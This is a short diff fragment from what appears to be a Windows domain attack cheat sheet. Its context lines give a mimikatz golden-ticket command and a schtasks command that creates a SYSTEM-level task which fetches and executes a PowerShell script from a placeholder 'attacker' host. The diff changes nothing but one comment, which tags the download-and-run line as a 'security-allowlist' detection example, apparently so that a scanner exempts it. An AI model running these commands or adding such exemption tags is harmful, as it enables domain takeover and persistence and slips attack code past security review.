@@ -209,7 +209,7 @@ mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
 
 # 3. Create scheduled task
 schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
-  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
+  /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'" # security-allowlist: offensive scheduled-task detection example
 schtasks /run /s DOMAIN /TN "enterprise"
 ```
 
